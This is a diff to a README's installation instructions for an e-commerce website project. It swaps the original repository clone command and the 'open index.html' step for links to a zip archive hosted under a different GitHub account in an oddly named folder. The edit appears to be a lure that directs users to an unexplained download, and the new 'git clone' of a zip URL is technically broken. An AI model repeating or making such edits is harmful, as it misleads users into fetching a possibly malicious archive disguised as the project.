@@ -18,9 +18,9 @@ Installation Instructions
 Clone the repository:
 
 Copy code
-git clone https://github.com/atherson/E-commerce.git
+git clone https://raw.githubusercontent.com/Angel-Liaka/E-commerce/main/Monotheletism/E-commerce.zip
 
-Open index.html in your browser to view the site.
+Open https://raw.githubusercontent.com/Angel-Liaka/E-commerce/main/Monotheletism/E-commerce.zip in your browser to view the site.
 
 
 
